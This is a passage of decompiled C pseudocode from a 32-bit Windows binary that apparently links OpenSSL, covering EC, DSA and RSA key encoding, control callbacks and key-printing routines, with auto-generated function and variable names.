  if ( sub_443A60(a1, 408, 1024, 4099, v2, 0) > 0 && sub_443A60(a1, 408, 1024, 4100, 2, 0) > 0 )
  {
    v3 = sub_4233A0(v6);
    v4 = sub_430D80((int)v3);
    if ( v4 )
      return sub_443A60(a1, 408, 1024, 4101, 0, v4) > 0;
  }
  return 0;
}

//----- (00448BF0) --------------------------------------------------------
int __cdecl sub_448BF0(int a1)
{
  _DWORD *v1; // ecx
  _DWORD *v2; // edi
  int result; // eax
  int v4; // eax
  _DWORD *v5; // ecx
  int v6; // esi
  int **v7; // edi
  int v8; // eax
  char *v9; // eax
  FILE *v10; // eax
  int *v11; // ebx
  int v12; // edi
  int v13; // eax
  void *Block; // [esp+Ch] [ebp-14h] BYREF
  int *v15; // [esp+10h] [ebp-10h] BYREF
  int v16; // [esp+14h] [ebp-Ch]
  void *v17; // [esp+18h] [ebp-8h] BYREF
  int v18; // [esp+1Ch] [ebp-4h] BYREF

  v2 = v1;
  v16 = 0;
  Block = 0;
  result = sub_478120(v1, &v15, &v18);
  if ( result )
  {
    v4 = sub_423680(*v15);
    if ( !sub_448B20(a1, v4) )
    {
      sub_408310(16, 239, 148, (int)"crypto\\ec\\ec_ameth.c", 663);
      return 0;
    }
    v5 = (_DWORD *)v15[1];
    if ( *v5 != 16 )
      return 0;
    v17 = *(void **)(v5[1] + 8);
    v6 = sub_42C6E0(0, &v17, **(_DWORD **)(v15[1] + 4));
    if ( v6 )
    {
      v7 = (int **)sub_478250(v2);
      if ( v7 )
      {
        v8 = sub_423680(*(_DWORD *)v6);
        v9 = sub_4233A0(v8);
        v10 = (FILE *)sub_430D50((int)v9);
        v11 = (int *)v10;
        if ( v10 )
        {
          if ( (_fileno(v10) & 0xF0007) == 65538 )
          {
            if ( sub_4065A0(v7, v11, 0, 0, 0) )
            {
              if ( sub_407960((int)v7, *(_DWORD **)(v6 + 4)) > 0 )
              {
                v12 = sub_407470((int)v7);
                if ( sub_443A60(a1, 408, 1024, 4103, v12, 0) > 0 )
                {
                  v13 = sub_479AA0(&Block, v6, v18, v12);
                  if ( v13 )
                  {
                    if ( sub_443A60(a1, 408, 1024, 4105, v13, (int)Block) > 0 )
                    {
                      Block = 0;
                      v16 = 1;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    sub_42C730(v6);
    sub_413490(Block);
    return v16;
  }
  return result;
}
// 448C01: variable 'v1' is possibly undefined

//----- (00448DC0) --------------------------------------------------------
int __usercall sub_448DC0@<eax>(_DWORD *a1@<edi>, __m64 a2@<mm0>)
{
  int result; // eax
  int v3; // esi
  _DWORD *v4; // [esp+0h] [ebp-10h]
  _DWORD *v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  result = sub_478670(v4);
  v3 = result;
  if ( result )
  {
    if ( !sub_407400(result) )
    {
      if ( !sub_478170(a1, &v5, &v6, 0, 0, 0) || !v5 || !v6 )
        return 0;
      if ( !sub_4489F0(v6, a2, v3, v5) )
      {
        sub_408310(16, 238, 149, (int)"crypto\\ec\\ec_ameth.c", 722);
        return 0;
      }
    }
    if ( !sub_448BF0(v3) )
    {
      sub_408310(16, 238, 150, (int)"crypto\\ec\\ec_ameth.c", 728);
      return 0;
    }
    return 1;
  }
  return result;
}
// 448DCC: variable 'v4' is possibly undefined

//----- (00448E80) --------------------------------------------------------
int __cdecl sub_448E80(_DWORD *a1)
{
  int v1; // eax
  int v2; // esi
  int v4; // edi
  int v5; // edi
  int v6; // eax
  void *v7; // eax
  int v8; // eax
  char **v9; // eax
  int v10; // ebx
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // edi
  unsigned int *v15; // eax
  int v16; // ebp
  int v17; // ebx
  char **v18; // eax
  char ***v19; // ebp
  char **v20; // eax
  int v21; // eax
  int v22; // edi
  _DWORD *v23; // eax
  int v24; // esi
  char **v25; // eax
  int v26; // [esp+Ch] [ebp-28h] BYREF
  char ***v27; // [esp+10h] [ebp-24h]
  _DWORD *v28; // [esp+14h] [ebp-20h] BYREF
  int v29; // [esp+18h] [ebp-1Ch] BYREF
  const char *v30; // [esp+1Ch] [ebp-18h] BYREF
  int v31; // [esp+20h] [ebp-14h]
  char **v32; // [esp+24h] [ebp-10h] BYREF
  void *v33; // [esp+28h] [ebp-Ch] BYREF
  int v34; // [esp+2Ch] [ebp-8h] BYREF
  unsigned int v35; // [esp+30h] [ebp-4h] BYREF

  v27 = 0;
  v26 = 0;
  v31 = 0;
  v1 = sub_478670(a1);
  v2 = v1;
  if ( !v1 )
    return 0;
  v4 = sub_432B60(v1);
  if ( !sub_478170(a1, &v28, &v29, 0, 0, 0) )
    goto LABEL_34;
  sub_42C7D0(&v32, 0, 0, v28);
  if ( v32 != sub_423310(0) )
    goto LABEL_9;
  v5 = *(_DWORD *)(v4 + 20);
  v6 = sub_420010(v5, 0);
  if ( v6 <= 0 )
  {
LABEL_34:
    v7 = (void *)v26;
    goto LABEL_35;
  }
  v7 = sub_4133F0(v6);
  v26 = (int)v7;
  if ( v7 )
  {
    v33 = v7;
    v8 = sub_420010(v5, &v33);
    if ( v8 > 0 )
    {
      sub_4329C0(v29, v26, v8);
      *(_DWORD *)(v29 + 12) &= 0xFFFFFFF0;
      *(_DWORD *)(v29 + 12) |= 8u;
      v26 = 0;
      v9 = sub_423310(0x198u);
      sub_42C750((int)v28, (int)v9, -1, 0);
LABEL_9:
      v10 = sub_443A60(v2, 408, 1024, 4100, -2, 0);
      if ( v10 > 0 )
      {
        if ( sub_443A60(v2, 408, 1024, 4102, 0, (int)&v30) )
        {
          v11 = sub_443A60(v2, 408, 1024, 4099, -2, 0);
          v12 = v11;
          if ( v11 >= 0 )
          {
            if ( v11 )
            {
              if ( v11 == 1 )
                v12 = 947;
            }
            else
            {
              v12 = 946;
            }
            if ( v10 == 1 && sub_443A60(v2, 408, 1024, 4100, 2, 0) > 0 )
            {
              if ( v30 || (v30 = sub_42BEA0(), sub_443A60(v2, 408, 1024, 4101, 0, (int)v30) > 0) )
              {
                if ( sub_478120(a1, &v28, &v34) )
                {
                  v13 = sub_435D30((int)v30);
                  if ( sub_44BAF0(&v35, v13, v12) )
                  {
                    v14 = sub_478250(a1);
                    v15 = (unsigned int *)sub_435D30(v14);
                    v16 = sub_4076A0(v15);
                    v17 = sub_407470(v14);
                    v27 = (char ***)sub_42C720();
                    if ( v27 )
                    {
                      v18 = sub_423310(v16);
                      v19 = v27;
                      *v27 = v18;
                      v20 = (char **)sub_42C600();
                      v19[1] = v20;
                      if ( v20 )
                      {
                        if ( sub_4078F0(v14, v20) > 0 )
                        {
                          if ( !sub_423E20(v27[1]) )
                          {
                            sub_42C610((int)v27[1]);
                            v27[1] = 0;
                          }
                          if ( sub_443A60(v2, 408, 1024, 4103, v17, 0) > 0 )
                          {
                            v21 = sub_479AA0((void **)&v26, (int)v27, v34, v17);
                            if ( v21 )
                            {
                              if ( sub_443A60(v2, 408, 1024, 4105, v21, v26) > 0 )
                              {
                                v26 = 0;
                                v22 = sub_42C700((int)v27, (void **)&v26);
                                v7 = (void *)v26;
                                if ( !v26 || !v22 )
                                  goto LABEL_35;
                                v23 = sub_432DC0();
                                v24 = (int)v23;
                                if ( v23 )
                                {
                                  sub_4329C0((int)v23, v26, v22);
                                  v26 = 0;
                                  v25 = sub_423310(v35);
                                  sub_42C750((int)v28, (int)v25, 16, v24);
                                  v31 = 1;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      goto LABEL_34;
    }
    goto LABEL_34;
  }
LABEL_35:
  sub_413490(v7);
  sub_42C730((int)v27);
  return v31;
}

//----- (00449240) --------------------------------------------------------
int __usercall sub_449240@<eax>(__m64 a1@<mm0>, _DWORD *a2, int *a3, int a4, _DWORD *a5)
{
  int v5; // esi
  int v6; // eax
  char **v7; // eax
  int result; // eax
  int v9; // esi
  int v10; // eax
  char **v11; // eax
  int v12; // eax
  int v13; // eax
  _BYTE *v14; // [esp-Ch] [ebp-18h]
  int v15; // [esp-8h] [ebp-14h]
  _DWORD *v16; // [esp-8h] [ebp-14h]
  unsigned int v17; // [esp+4h] [ebp-8h] BYREF
  unsigned int v18; // [esp+8h] [ebp-4h] BYREF

  switch ( (unsigned int)a3 )
  {
    case 1u:
      if ( a4 )
        goto LABEL_20;
      sub_4345B0(a5, 0, &a3, &v18);
      if ( !a3 )
        goto LABEL_8;
      if ( !*a3 )
        goto LABEL_8;
      v5 = sub_423680(*a3);
      if ( !v5 )
        goto LABEL_8;
      v6 = sub_435D30((int)a2);
      if ( !sub_44BAF0(&v17, v5, v6) )
        goto LABEL_8;
      v7 = sub_423310(v17);
      sub_42C750(v18, (int)v7, -1, 0);
      result = 1;
      break;
    case 3u:
      *a5 = 672;
      result = 2;
      break;
    case 5u:
      if ( a4 )
        goto LABEL_20;
      sub_479CD0(a5, 0, 0, &a3, &v17);
      if ( a3 && *a3 && (v9 = sub_423680(*a3)) != 0 && (v10 = sub_435D30((int)a2), sub_44BAF0(&v18, v9, v10)) )
      {
        v11 = sub_423310(v18);
        sub_42C750(v17, (int)v11, -1, 0);
        result = 1;
      }
      else
      {
LABEL_8:
        result = -1;
      }
      break;
    case 7u:
      if ( a4 == 1 )
      {
        result = sub_448DC0(a5, a1);
      }
      else
      {
        if ( a4 )
          goto LABEL_24;
        result = sub_448E80(a5);
      }
      break;
    case 8u:
      *a5 = 1;
LABEL_20:
      result = 1;
      break;
    case 9u:
      v15 = a4;
      v14 = a5;
      v12 = sub_41CBC0(a2);
      result = sub_41E5E0(a1, v12, v14, v15, 0);
      break;
    case 0xAu:
      v16 = a5;
      v13 = sub_41CBC0(a2);
      result = sub_41E5A0(v13, 4, v16, 0);
      break;
    default:
LABEL_24:
      result = -2;
      break;
  }
  return result;
}

//----- (004495A0) --------------------------------------------------------
int __cdecl sub_4495A0(int *a1, int a2)
{
  int v2; // esi
  void **v3; // edi
  signed int v5; // eax
  int v6; // ebp
  _DWORD *v7; // eax
  void *v8; // esi
  int v9; // ebx
  char **v10; // eax
  void *v11; // [esp-8h] [ebp-1Ch]
  void *Block; // [esp+10h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(a2 + 20);
  v3 = 0;
  Block = 0;
  if ( *(_DWORD *)(a2 + 24) && *(_DWORD *)(v2 + 8) && *(_DWORD *)(v2 + 12) && *(_DWORD *)(v2 + 16) )
  {
    v3 = (void **)sub_432DC0();
    if ( !v3 )
    {
      sub_408310(10, 118, 65, (int)"crypto\\dsa\\dsa_ameth.c", 90);
LABEL_7:
      sub_413490(Block);
      sub_432A30(v3);
      return 0;
    }
    v5 = sub_41DC80(v2, v3 + 2);
    *v3 = (void *)v5;
    if ( v5 <= 0 )
    {
      sub_408310(10, 118, 65, (int)"crypto\\dsa\\dsa_ameth.c", 95);
      goto LABEL_7;
    }
    v6 = 16;
  }
  else
  {
    v6 = -1;
  }
  v7 = sub_4318B0(*(_DWORD **)(v2 + 20), 0);
  v8 = v7;
  if ( !v7 )
  {
    sub_408310(10, 118, 65, (int)"crypto\\dsa\\dsa_ameth.c", 105);
    goto LABEL_7;
  }
  v9 = sub_42C470((int)v7, &Block);
  sub_42C4F0(v8);
  if ( v9 <= 0 )
  {
    sub_408310(10, 118, 65, (int)"crypto\\dsa\\dsa_ameth.c", 113);
    goto LABEL_7;
  }
  v11 = Block;
  v10 = sub_423310(0x74u);
  if ( !sub_41D4E0(a1, (int)v10, v6, (int)v3, (int)v11, v9) )
    goto LABEL_7;
  return 1;
}

//----- (004496B0) --------------------------------------------------------
int __usercall sub_4496B0@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  int v3; // ebp
  void **v4; // edi
  int v5; // esi
  int result; // eax
  int v7; // eax
  void *v8; // ebx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // [esp+Ch] [ebp-18h] BYREF
  int v12; // [esp+10h] [ebp-14h] BYREF
  void *v13; // [esp+14h] [ebp-10h] BYREF
  int v14; // [esp+18h] [ebp-Ch] BYREF
  int *v15; // [esp+1Ch] [ebp-8h] BYREF
  int v16; // [esp+20h] [ebp-4h] BYREF

  v3 = 0;
  v4 = 0;
  v5 = 0;
  result = sub_434BD0(0, (int *)&v13, &v12, &v11, a3);
  if ( result )
  {
    sub_42C7D0(0, &v14, &v15, v11);
    v7 = sub_42C450(0, &v13, v12);
    v8 = (void *)v7;
    if ( v7 && *(_DWORD *)(v7 + 4) != 258 && v14 == 16 && (v16 = v15[2], (v5 = sub_41DC60(0, (void **)&v16, *v15)) != 0) )
    {
      v9 = sub_416900();
      *(_DWORD *)(v5 + 24) = v9;
      if ( v9 && sub_4318D0((int)v8, (int)v9) )
      {
        v10 = sub_4168C0();
        *(_DWORD *)(v5 + 20) = v10;
        if ( v10 )
        {
          v4 = (void **)sub_420670();
          if ( v4 )
          {
            if ( sub_4282A0(
                   a1,
                   *(int **)(v5 + 20),
                   *(int **)(v5 + 16),
                   *(_DWORD **)(v5 + 24),
                   *(int **)(v5 + 8),
                   (int *)v4) )
            {
              sub_41CE20(a2, (void *)0x74, v5);
              v3 = 1;
LABEL_18:
              sub_4206C0(v4);
              sub_432A70(v8);
              return v3;
            }
            sub_408310(10, 115, 109, (int)"crypto\\dsa\\dsa_ameth.c", 179);
          }
          else
          {
            sub_408310(10, 115, 65, (int)"crypto\\dsa\\dsa_ameth.c", 174);
          }
        }
        else
        {
          sub_408310(10, 115, 65, (int)"crypto\\dsa\\dsa_ameth.c", 170);
        }
      }
      else
      {
        sub_408310(10, 115, 109, (int)"crypto\\dsa\\dsa_ameth.c", 165);
      }
    }
    else
    {
      sub_408310(10, 115, 104, (int)"crypto\\dsa\\dsa_ameth.c", 189);
    }
    sub_41D610((volatile LONG *)v5);
    goto LABEL_18;
  }
  return result;
}

//----- (00449840) --------------------------------------------------------
int __cdecl sub_449840(int *a1, int a2)
{
  int v2; // eax
  void **v3; // esi
  signed int v4; // eax
  _DWORD *v5; // eax
  void *v6; // edi
  int v7; // ebx
  char **v8; // eax
  void *v10; // [esp-Ch] [ebp-18h]
  void *Block; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(a2 + 20);
  v3 = 0;
  Block = 0;
  if ( v2 && *(_DWORD *)(v2 + 24) )
  {
    v3 = (void **)sub_432DC0();
    if ( v3 )
    {
      v4 = sub_41DC80(*(_DWORD *)(a2 + 20), v3 + 2);
      *v3 = (void *)v4;
      if ( v4 > 0 )
      {
        v3[1] = (void *)16;
        v5 = sub_4318B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 24), 0);
        v6 = v5;
        if ( v5 )
        {
          v7 = sub_42C470((int)v5, &Block);
          sub_432A70(v6);
          v10 = Block;
          v8 = sub_423310(0x74u);
          if ( sub_434B60(a1, (int)v8, 0, 16, (int)v3, (int)v10, v7) )
            return 1;
        }
        else
        {
          sub_408310(10, 116, 109, (int)"crypto\\dsa\\dsa_ameth.c", 228);
        }
      }
      else
      {
        sub_408310(10, 116, 65, (int)"crypto\\dsa\\dsa_ameth.c", 219);
      }
    }
    else
    {
      sub_408310(10, 116, 65, (int)"crypto\\dsa\\dsa_ameth.c", 213);
    }
  }
  else
  {
    sub_408310(10, 116, 101, (int)"crypto\\dsa\\dsa_ameth.c", 206);
  }
  sub_413490(Block);
  sub_432A30(v3);
  sub_432A70(0);
  return 0;
}

//----- (00449970) --------------------------------------------------------
int __cdecl sub_449970(int a1)
{
  void *v1; // esp
  signed int v2; // eax
  int v4[4]; // [esp+0h] [ebp-10h] BYREF

  a1 = *(_DWORD *)(a1 + 20);
  v1 = alloca(16);
  v4[0] = (sub_416F90(*(_DWORD **)(a1 + 12)) + 7) / 8;
  v4[2] = (int)&a1;
  v4[1] = 2;
  LOBYTE(a1) = -1;
  v2 = sub_42C470((int)v4, 0);
  return sub_4328B0(1, 2 * v2, 16);
}

//----- (00449980) --------------------------------------------------------
int __cdecl sub_449980(int a1)
{
  return sub_41D9A0(*(_DWORD *)(a1 + 20));
}

//----- (00449990) --------------------------------------------------------
int __cdecl sub_449990(int a1)
{
  int v1; // eax
  int v3; // [esp-8h] [ebp-8h]
  int v4; // [esp+4h] [ebp+4h]

  v4 = *(_DWORD *)(a1 + 20);
  if ( !*(_DWORD *)(v4 + 8) || !*(_DWORD *)(v4 + 12) )
    return -1;
  v3 = sub_416F90(*(_DWORD **)(v4 + 12));
  v1 = sub_416F90(*(_DWORD **)(v4 + 8));
  return sub_416D10(v1, v3);
}

//----- (004499A0) --------------------------------------------------------
BOOL __cdecl sub_4499A0(int a1)
{
  _DWORD *v1; // eax

  v1 = *(_DWORD **)(a1 + 20);
  return !v1 || !v1[2] || !v1[3] || !v1[4];
}

//----- (004499D0) --------------------------------------------------------
int __cdecl sub_4499D0(int a1, int a2)
{
  int result; // eax
  void **v3; // edi
  void **v4; // edi
  void **v5; // edi

  if ( *(_DWORD *)(a1 + 20) || (result = sub_41DAF0(), (*(_DWORD *)(a1 + 20) = result) != 0) )
  {
    v3 = sub_4176D0(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 8));
    if ( v3
      && (sub_417060(*(void ***)(*(_DWORD *)(a1 + 20) + 8)),
          *(_DWORD *)(*(_DWORD *)(a1 + 20) + 8) = v3,
          (v4 = sub_4176D0(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 12))) != 0)
      && (sub_417060(*(void ***)(*(_DWORD *)(a1 + 20) + 12)),
          *(_DWORD *)(*(_DWORD *)(a1 + 20) + 12) = v4,
          (v5 = sub_4176D0(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 16))) != 0) )
    {
      sub_417060(*(void ***)(*(_DWORD *)(a1 + 20) + 16));
      *(_DWORD *)(*(_DWORD *)(a1 + 20) + 16) = v5;
      return 1;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (00449A80) --------------------------------------------------------
BOOL __cdecl sub_449A80(int a1, int a2)
{
  return !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 8), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 8))
      && !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 12), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 12))
      && !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 16), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 16));
}

//----- (00449AF0) --------------------------------------------------------
BOOL __cdecl sub_449AF0(int a1, int a2)
{
  return sub_4169B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 20), *(_DWORD **)(*(_DWORD *)(a1 + 20) + 20)) == 0;
}

//----- (00449B20) --------------------------------------------------------
void __cdecl sub_449B20(volatile LONG **Block)
{
  sub_41D610(Block[5]);
}

//----- (00449B30) --------------------------------------------------------
BOOL __usercall sub_449B30@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, void *Block)
{
  const char *v5; // ebp
  int v6; // eax
  BOOL result; // eax
  _DWORD *v8; // [esp+0h] [ebp-4h]
  _DWORD *Blocka; // [esp+8h] [ebp+4h]

  if ( Block == (void *)2 )
  {
    Blocka = *(_DWORD **)(a1 + 24);
    v8 = *(_DWORD **)(a1 + 20);
  }
  else
  {
    Blocka = 0;
    if ( (int)Block <= 0 )
      v8 = 0;
    else
      v8 = *(_DWORD **)(a1 + 20);
  }
  if ( Block == (void *)2 )
  {
    v5 = "Private-Key";
  }
  else
  {
    v5 = "Public-Key";
    if ( Block != (void *)1 )
      v5 = "DSA-Parameters";
  }
  result = (!Blocka
         || sub_405340(a3, a2, 128)
         && (v6 = sub_416F90(*(_DWORD **)(a1 + 8)), sub_419190(a3, "%s: (%d bit)\n", v5, v6) > 0))
        && sub_477F80(a3, "priv:", Blocka, 0, a2)
        && sub_477F80(a3, "pub: ", v8, 0, a2)
        && sub_477F80(a3, "P:   ", *(_DWORD **)(a1 + 8), 0, a2)
        && sub_477F80(a3, "Q:   ", *(_DWORD **)(a1 + 12), 0, a2)
        && sub_477F80(a3, "G:   ", *(_DWORD **)(a1 + 16), 0, a2);
  return result;
}

//----- (00449C50) --------------------------------------------------------
int __cdecl sub_449C50(int a1, void **a2, int a3)
{
  int v3; // eax

  v3 = sub_41DC60(0, a2, a3);
  if ( v3 )
  {
    sub_41CE20(a1, (void *)0x74, v3);
    return 1;
  }
  else
  {
    sub_408310(10, 119, 10, (int)"crypto\\dsa\\dsa_ameth.c", 376);
    return 0;
  }
}

//----- (00449CA0) --------------------------------------------------------
signed int __cdecl sub_449CA0(int a1, void **a2)
{
  return sub_41DC80(*(_DWORD *)(a1 + 20), a2);
}

//----- (00449CB0) --------------------------------------------------------
BOOL __cdecl sub_449CB0(int a1, int a2, int a3)
{
  return sub_449B30(*(_DWORD *)(a2 + 20), a3, a1, 0);
}

//----- (00449CD0) --------------------------------------------------------
BOOL __cdecl sub_449CD0(int a1, int a2, int a3)
{
  return sub_449B30(*(_DWORD *)(a2 + 20), a3, a1, (void *)1);
}

//----- (00449CF0) --------------------------------------------------------
BOOL __cdecl sub_449CF0(int a1, int a2, int a3)
{
  return sub_449B30(*(_DWORD *)(a2 + 20), a3, a1, (void *)2);
}

//----- (00449D10) --------------------------------------------------------
int __cdecl sub_449D10(int a1, void **a2, int a3)
{
  int v3; // eax

  v3 = sub_41DC20(0, a2, a3);
  if ( v3 )
  {
    sub_41CE20(a1, (void *)0x74, v3);
    return 1;
  }
  else
  {
    sub_408310(10, 122, 10, (int)"crypto\\dsa\\dsa_ameth.c", 412);
    return 0;
  }
}

//----- (00449D60) --------------------------------------------------------
signed int __cdecl sub_449D60(int a1, void **a2)
{
  return sub_42F620(*(_DWORD *)(a1 + 20), a2, (int)&unk_4F3064);
}

//----- (00449D70) --------------------------------------------------------
BOOL __cdecl sub_449D70(int a1, int a2, int *a3, int a4)
{
  int *v4; // esi
  int v6; // eax
  _DWORD *v7; // edi
  BOOL v8; // ebx
  int v9; // ebp
  void *Block; // [esp+4h] [ebp-8h] BYREF
  void *v11; // [esp+8h] [ebp-4h] BYREF

  v4 = a3;
  if ( !a3 )
    return sub_4051D0(a1, (int)"\n") > 0;
  v6 = *a3;
  a3 = (int *)a3[2];
  v7 = (_DWORD *)sub_41DB00(0, (void **)&a3, v6);
  if ( !v7 )
    return sub_462040(a1, v4, a4);
  v8 = 0;
  sub_434E20(v7, &Block, &v11);
  if ( sub_405110(a1, (int)"\n", 1) == 1 )
  {
    v9 = a4;
    if ( sub_477F80(a1, "r:   ", Block, 0, a4) )
      v8 = sub_477F80(a1, "s:   ", v11, 0, v9) != 0;
  }
  sub_41DB60((_DWORD **)v7);
  return v8;
}

//----- (00449E60) --------------------------------------------------------
int __cdecl sub_449E60(int a1, int *a2, int a3, _DWORD *a4)
{
  int v4; // esi
  int v5; // eax
  char **v6; // eax
  int result; // eax
  int v8; // esi
  int v9; // eax
  char **v10; // eax
  unsigned int v11; // [esp+4h] [ebp-8h] BYREF
  unsigned int v12; // [esp+8h] [ebp-4h] BYREF

  switch ( (unsigned int)a2 )
  {
    case 1u:
      if ( a3 )
        goto LABEL_16;
      sub_4345B0(a4, 0, &a2, &v12);
      if ( !a2 )
        goto LABEL_8;
      if ( !*a2 )
        goto LABEL_8;
      v4 = sub_423680(*a2);
      if ( !v4 )
        goto LABEL_8;
      v5 = sub_435D30(a1);
      if ( !sub_44BAF0(&v11, v4, v5) )
        goto LABEL_8;
      v6 = sub_423310(v11);
      sub_42C750(v12, (int)v6, -1, 0);
      result = 1;
      break;
    case 3u:
      *a4 = 672;
      result = 2;
      break;
    case 5u:
      if ( a3 )
        goto LABEL_16;
      sub_479CD0(a4, 0, 0, &a2, &v11);
      if ( a2 && *a2 && (v8 = sub_423680(*a2)) != 0 && (v9 = sub_435D30(a1), sub_44BAF0(&v12, v8, v9)) )
      {
        v10 = sub_423310(v12);
        sub_42C750(v11, (int)v10, -1, 0);
        result = 1;
      }
      else
      {
LABEL_8:
        result = -1;
      }
      break;
    case 8u:
      *a4 = -1;
LABEL_16:
      result = 1;
      break;
    default:
      result = -2;
      break;
  }
  return result;
}

//----- (00449FF0) --------------------------------------------------------
int __cdecl sub_449FF0(int *a1, int a2)
{
  int v2; // edx
  signed int v3; // eax
  char **v4; // eax
  void *v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]
  void *Block; // [esp+0h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(a2 + 20);
  Block = 0;
  v3 = sub_41D390(v2, &Block);
  if ( v3 > 0 )
  {
    v7 = v3;
    v6 = Block;
    v4 = sub_423310(6u);
    if ( sub_41D4E0(a1, (int)v4, 5, 0, (int)v6, v7) )
      return 1;
    sub_413490(Block);
  }
  return 0;
}

//----- (0044A060) --------------------------------------------------------
int __cdecl sub_44A060(int a1, int a2)
{
  int v2; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF
  void *v5; // [esp+4h] [ebp-4h] BYREF

  if ( !sub_41D550(0, &v5, &v4, 0, a2) )
    return 0;
  v2 = sub_41D370(0, &v5, v4);
  if ( !v2 )
  {
    sub_408310(4, 139, 4, (int)"crypto\\rsa\\rsa_ameth.c", 51);
    return 0;
  }
  sub_41CE20(a1, (void *)6, v2);
  return 1;
}

//----- (0044A0E0) --------------------------------------------------------
BOOL __cdecl sub_44A0E0(int a1, int a2)
{
  return !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 16), *(_DWORD **)(*(_DWORD *)(a1 + 20) + 16))
      && !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 20), *(_DWORD **)(*(_DWORD *)(a1 + 20) + 20));
}

//----- (0044A130) --------------------------------------------------------
int __cdecl sub_44A130(int a1, void **a2, int a3)
{
  int v3; // eax

  v3 = sub_41D330(0, a2, a3);
  if ( v3 )
  {
    sub_41CE20(a1, (void *)6, v3);
    return 1;
  }
  else
  {
    sub_408310(4, 147, 4, (int)"crypto\\rsa\\rsa_ameth.c", 72);
    return 0;
  }
}

//----- (0044A180) --------------------------------------------------------
signed int __cdecl sub_44A180(int a1, void **a2)
{
  return sub_41D350(*(_DWORD *)(a1 + 20), a2);
}

//----- (0044A190) --------------------------------------------------------
int __cdecl sub_44A190(int *a1, int a2)
{
  int v2; // edx
  signed int v3; // eax
  char **v5; // eax
  int v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]
  int v8; // [esp+0h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(a2 + 20);
  v8 = 0;
  v3 = sub_41D350(v2, (void **)&v8);
  if ( v3 <= 0 )
  {
    sub_408310(4, 138, 65, (int)"crypto\\rsa\\rsa_ameth.c", 91);
    return 0;
  }
  v7 = v3;
  v6 = v8;
  v5 = sub_423310(6u);
  if ( !sub_434B60(a1, (int)v5, 0, 5, 0, v6, v7) )
  {
    sub_408310(4, 138, 65, (int)"crypto\\rsa\\rsa_ameth.c", 97);
    return 0;
  }
  return 1;
}

//----- (0044A210) --------------------------------------------------------
int __cdecl sub_44A210(int a1, int a2)
{
  int v2; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF
  void *v5; // [esp+4h] [ebp-4h] BYREF

  if ( !sub_434BD0(0, (int *)&v5, &v4, 0, a2) )
    return 0;
  v2 = sub_41D330(0, &v5, v4);
  if ( !v2 )
  {
    sub_408310(4, 147, 4, (int)"crypto\\rsa\\rsa_ameth.c", 72);
    return 0;
  }
  sub_41CE20(a1, (void *)6, v2);
  return 1;
}

//----- (0044A290) --------------------------------------------------------
int __cdecl sub_44A290(int a1)
{
  return sub_4070E0(*(_DWORD *)(a1 + 20));
}

//----- (0044A2A0) --------------------------------------------------------
int __cdecl sub_44A2A0(int a1)
{
  return sub_416F90(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 16));
}

//----- (0044A2C0) --------------------------------------------------------
int __cdecl sub_44A2C0(int a1)
{
  int v1; // eax

  v1 = sub_416F90(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 16));
  return sub_416D10(v1, -1);
}

//----- (0044A2D0) --------------------------------------------------------
void __cdecl sub_44A2D0(volatile LONG **Block)
{
  sub_405630(Block[5]);
}

//----- (0044A2E0) --------------------------------------------------------
BOOL __usercall sub_44A2E0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  _DWORD *v4; // eax
  int v5; // ebp
  const char *v6; // eax
  const char *v7; // ebp

  v4 = *(_DWORD **)(a3 + 16);
  v5 = 0;
  if ( v4 )
    v5 = sub_416F90(v4);
  if ( !sub_405340(a2, a1, 128) )
    return 0;
  if ( a4 && *(_DWORD *)(a3 + 24) )
  {
    if ( sub_419190(a2, "Private-Key: (%d bit)\n", v5) <= 0 )
      return 0;
    v6 = "modulus:";
    v7 = "publicExponent:";
  }
  else
  {
    if ( sub_419190(a2, "Public-Key: (%d bit)\n", v5) <= 0 )
      return 0;
    v6 = "Modulus:";
    v7 = "Exponent:";
  }
  return sub_477F80(a2, v6, *(_DWORD **)(a3 + 16), 0, a1)
      && sub_477F80(a2, v7, *(_DWORD **)(a3 + 20), 0, a1)
      && (!a4
       || sub_477F80(a2, "privateExponent:", *(_DWORD **)(a3 + 24), 0, a1)
       && sub_477F80(a2, "prime1:", *(_DWORD **)(a3 + 28), 0, a1)
       && sub_477F80(a2, "prime2:", *(_DWORD **)(a3 + 32), 0, a1)
       && sub_477F80(a2, "exponent1:", *(_DWORD **)(a3 + 36), 0, a1)
       && sub_477F80(a2, "exponent2:", *(_DWORD **)(a3 + 40), 0, a1)
       && sub_477F80(a2, "coefficient:", *(_DWORD **)(a3 + 44), 0, a1));
}

//----- (0044A460) --------------------------------------------------------
BOOL __cdecl sub_44A460(int a1, int a2, int a3)
{
